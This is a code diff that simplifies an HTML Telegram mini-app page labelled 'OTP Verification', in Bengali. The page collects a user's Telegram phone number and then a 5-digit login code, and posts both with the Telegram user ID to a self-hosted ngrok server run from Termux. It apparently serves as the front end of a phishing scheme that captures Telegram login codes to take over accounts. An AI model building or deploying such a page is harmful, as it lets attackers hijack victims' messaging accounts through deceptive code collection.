@@ -2,103 +2,68 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>OTP Verification</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         * { box-sizing: border-box; }
-        body { font-family: 'Segoe UI', Tahoma, sans-serif; padding: 20px; background: #1e1e1e; color: #ffffff; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
-        .container { max-width: 400px; width: 100%; background: #2c2c2c; padding: 20px; border-radius: 10px; box-shadow: 0 4px 12px rgba(0,0,0,0.5); }
-        h2 { text-align: center; margin-bottom: 20px; color: #00ccff; }
-        input { width: 100%; padding: 12px; margin: 8px 0 15px 0; border-radius: 8px; border: 1px solid #444; background: #333; color: white; font-size: 16px; }
-        button { width: 100%; padding: 12px; background: #0088cc; color: white; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; transition: 0.2s; font-size: 16px; margin-bottom: 10px; }
+        body { font-family: sans-serif; padding: 20px; background: #1e1e1e; color: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        .container { max-width: 400px; width: 100%; background: #2c2c2c; padding: 20px; border-radius: 10px; }
+        h2 { text-align: center; color: #00ccff; }
+        input { width: 100%; padding: 12px; margin: 8px 0 15px 0; border-radius: 8px; border: 1px solid #444; background: #333; color: white; }
+        button { width: 100%; padding: 12px; background: #0088cc; color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; }
         button:hover { background: #006699; }
-        #result { text-align: center; font-size: 16px; margin-top: 15px; font-weight: bold; }
         .success { color: #00e676; }
         .error { color: #ff5252; }
         #otpSection { display: none; }
-        .hidden { display: none; }
     </style>
 </head>
 <body>
-
-<div class="container" id="app">
+<div class="container">
     <h2>📱 ফোন ভেরিফাই করুন</h2>
-    
     <div id="phoneSection">
-        <label>টেলিগ্রাম নম্বর দিন:</label>
+        <label>নম্বর দিন:</label>
         <input type="tel" id="phone" placeholder="+8801XXXXXXXXX">
         <button onclick="sendOTP()">OTP পাঠান</button>
     </div>
-
     <div id="otpSection">
-        <label>OTP কোড দিন (৫ ডিজিট):</label>
-        <input type="text" id="otp" placeholder="12345" maxlength="5" inputmode="numeric">
+        <label>OTP কোড (৫ ডিজিট):</label>
+        <input type="text" id="otp" placeholder="12345" maxlength="5">
         <button onclick="verifyOTP()">যাচাই করুন</button>
     </div>
-
     <div id="result"></div>
 </div>
-
 <script>
-    const tg = window.Telegram.WebApp;
-    tg.ready();
+    const tg = window.Telegram.WebApp; tg.ready();
     const userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id : null;
 
-    // 🟢 গুরুত্বপূর্ণ: Termux-এ Ngrok দিয়ে যে লিংক পাবেন, সেটি এখানে বসাতে হবে।
+    // 🔴 সাবধান! এই লিংকটি আপনার Ngrok এর লিংক দিয়ে পরিবর্তন করুন।
     const API_BASE = "https://xxxx-xxxx.ngrok-free.app"; 
-
-    function showResult(msg, type) {
-        const res = document.getElementById('result');
-        res.innerHTML = msg;
-        res.className = type;
-    }
 
     async function sendOTP() {
         const phone = document.getElementById('phone').value;
-        if(!phone) { alert("নম্বর দিন!"); return; }
-        showResult("📤 OTP পাঠানো হচ্ছে...", "");
-        
         try {
             const res = await fetch(`${API_BASE}/send-otp`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
+                method: 'POST', headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ user_id: userId, phone: phone })
             });
             const data = await res.json();
             if(data.status === 'success') {
-                showResult(data.message, "success");
                 document.getElementById('phoneSection').style.display = 'none';
                 document.getElementById('otpSection').style.display = 'block';
-            } else {
-                showResult(data.message, "error");
-            }
-        } catch (error) {
-            showResult("❌ সার্ভার যোগাযোগ ব্যর্থ! Termux ও Ngrok চালু আছে কিনা চেক করুন।", "error");
-        }
+                document.getElementById('result').innerHTML = "✅ OTP পাঠানো হয়েছে!";
+            } else { document.getElementById('result').innerHTML = "❌ " + data.message; }
+        } catch(e) { document.getElementById('result').innerHTML = "❌ সার্ভার কানেক্ট ব্যর্থ! Ngrok চালু করুন।"; }
     }
-
     async function verifyOTP() {
         const otp = document.getElementById('otp').value;
-        if(!otp || otp.length < 5) { alert("সঠিক ৫ ডিজিটের OTP দিন!"); return; }
-        showResult("🔄 যাচাই করা হচ্ছে...", "");
-        
         try {
             const res = await fetch(`${API_BASE}/verify-otp`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
+                method: 'POST', headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ user_id: userId, otp: otp })
             });
             const data = await res.json();
-            if(data.status === 'success') {
-                showResult(data.message, "success");
-                document.getElementById('otpSection').style.display = 'none';
-            } else {
-                showResult(data.message, "error");
-            }
-        } catch (error) {
-            showResult("❌ যাচাই করতে সমস্যা হচ্ছে।", "error");
-        }
+            document.getElementById('result').innerHTML = data.status === 'success' ? "✅ " + data.message : "❌ " + data.message;
+        } catch(e) { document.getElementById('result').innerHTML = "❌ কানেক্ট ব্যর্থ!"; }
     }
 </script>
 </body>
